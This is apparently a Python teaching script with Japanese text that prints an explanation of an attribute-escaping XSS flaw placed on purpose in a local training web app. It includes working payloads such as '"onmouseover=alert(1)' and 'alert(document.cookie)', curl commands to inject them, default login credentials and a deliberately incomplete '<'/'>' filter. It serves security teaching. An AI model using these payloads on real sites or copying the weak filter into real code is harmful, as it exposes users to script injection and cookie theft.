#!/usr/bin/env python3
"""
属性脱出型配列パラメータXSS脆弱性の説明とテスト方法

修正された脆弱性:
- ><は使用不可（フィルタされる）
- "を使って属性から脱出するXSS
- レスポンスで"が使われるHTML構造

攻撃例: address["onmouseover=alert(1)] 
"""

def print_vulnerability_info():
    """脆弱性の詳細説明"""
    print("🔒 属性脱出型配列パラメータXSS脆弱性")
    print("=" * 50)
    
    print("\n📝 脆弱性の概要:")
    print("- 配列パラメータ address[key] の key 部分にXSSペイロードを注入")
    print("- HTMLの属性値内で\" を使って属性から脱出")
    print("- イベントハンドラを追加してJavaScriptを実行")
    print("- ><文字はフィルタされるため、属性脱出のみが有効")
    
    print("\n🛡️ 実装されたフィルタ:")
    print("- '>' と '<' 文字をブロック")
    print("- '\"' 文字は許可（属性脱出を可能にするため）")
    
    print("\n🎯 攻撃対象のHTML構造:")
    print('```html')
    print('<input type="text" class="form-control-plaintext d-inline"')
    print('       value="ユーザー入力値" readonly')
    print('       data-key="ユーザー入力キー"')
    print('       title="配列パラメータ: address[ユーザー入力キー]">')
    print('```')
    
    print("\n💥 攻撃ペイロード例:")
    examples = [
        {
            "payload": '"onmouseover=alert(1)',
            "description": "マウスオーバー時にalert実行",
            "result": 'value=""onmouseover=alert(1)"'
        },
        {
            "payload": '"onfocus=alert(document.domain)',
            "description": "フォーカス時にドメイン表示", 
            "result": 'value=""onfocus=alert(document.domain)"'
        },
        {
            "payload": '"onclick=alert(document.cookie)',
            "description": "クリック時にクッキー表示",
            "result": 'value=""onclick=alert(document.cookie)"'
        },
        {
            "payload": '"style="color:red"onmouseover="alert(1)',
            "description": "複合属性とイベントハンドラ",
            "result": 'value=""style="color:red"onmouseover="alert(1)"'
        }
    ]
    
    for i, example in enumerate(examples, 1):
        print(f"\n{i}. {example['description']}")
        print(f"   ペイロード: address[{example['payload']}]")
        print(f"   結果HTML: {example['result']}")

def print_curl_commands():
    """cURLコマンド例を表示"""
    print("\n📋 cURLコマンド例:")
    print("=" * 30)
    
    print("\n### 1. 基本的な属性脱出XSS")
    print("```bash")
    print("curl -X POST http://localhost:5000/user/profile/edit \\")
    print('  -H "Content-Type: application/x-www-form-urlencoded" \\')
    print('  -H "Cookie: session=YOUR_SESSION_COOKIE" \\')
    print('  --data-urlencode "email=admin@example.com" \\')
    print('  --data-urlencode "address=東京都渋谷区" \\')
    print('  --data-urlencode "phone=090-1234-5678" \\')
    print('  --data-urlencode \'address["onmouseover=alert(1)]=test_value\'')
    print("```")
    
    print("\n### 2. フォーカスイベントXSS")
    print("```bash")
    print("curl -X POST http://localhost:5000/user/profile/edit \\")
    print('  -H "Content-Type: application/x-www-form-urlencoded" \\')
    print('  -H "Cookie: session=YOUR_SESSION_COOKIE" \\')
    print('  --data-urlencode "email=admin@example.com" \\')
    print('  --data-urlencode "address=東京都渋谷区" \\')
    print('  --data-urlencode "phone=090-1234-5678" \\')
    print('  --data-urlencode \'address["onfocus=alert(document.domain)]=test_value\'')
    print("```")
    
    print("\n### 3. 複合属性脱出XSS")
    print("```bash")
    print("curl -X POST http://localhost:5000/user/profile/edit \\")
    print('  -H "Content-Type: application/x-www-form-urlencoded" \\')
    print('  -H "Cookie: session=YOUR_SESSION_COOKIE" \\')
    print('  --data-urlencode "email=admin@example.com" \\')
    print('  --data-urlencode "address=東京都渋谷区" \\')
    print('  --data-urlencode "phone=090-1234-5678" \\')
    print('  --data-urlencode \'address["style="color:red"onmouseover="alert(1)]=test_value\'')
    print("```")

def print_test_procedure():
    """テスト手順を表示"""
    print("\n🔬 テスト手順:")
    print("=" * 20)
    
    print("\n1. サーバー起動:")
    print("   python run.py")
    
    print("\n2. ブラウザでログイン:")
    print("   http://localhost:5000/login")
    print("   ユーザー名: admin")
    print("   パスワード: admin123")
    
    print("\n3. プロフィール編集ページにアクセス:")
    print("   http://localhost:5000/user/profile/edit")
    
    print("\n4. ブラウザの開発者ツールでNetworkタブを開く")
    
    print("\n5. フォーム送信時にHTTPリクエストを編集:")
    print("   address[\"onmouseover=alert(1)] = test_value")
    print("   を追加してリクエスト送信")
    
    print("\n6. プロフィールページで結果確認:")
    print("   http://localhost:5000/user/profile")
    print("   デバッグ情報のinput要素にマウスオーバーするとalert実行")

def print_blocked_payloads():
    """ブロックされるペイロード例"""
    print("\n🚫 ブロックされるペイロード（><フィルタ）:")
    print("=" * 40)
    
    blocked = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '><script>alert(1)</script>',
        'test>alert(1)<test',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script><"'
    ]
    
    for payload in blocked:
        print(f"❌ {payload}")
    
    print("\n✅ 許可されるペイロード（属性脱出のみ）:")
    allowed = [
        '"onmouseover=alert(1)',
        '"onfocus=alert(1)',
        '"onclick=alert(1)',
        '"onerror=alert(1)',
        '"style="color:red"onmouseover="alert(1)'
    ]
    
    for payload in allowed:
        print(f"✅ {payload}")

if __name__ == "__main__":
    print_vulnerability_info()
    print_curl_commands()
    print_test_procedure()
    print_blocked_payloads()
    
    print("\n" + "=" * 50)
    print("📖 この脆弱性は教育目的でのみ使用してください")
    print("🔒 実際の攻撃は違法です")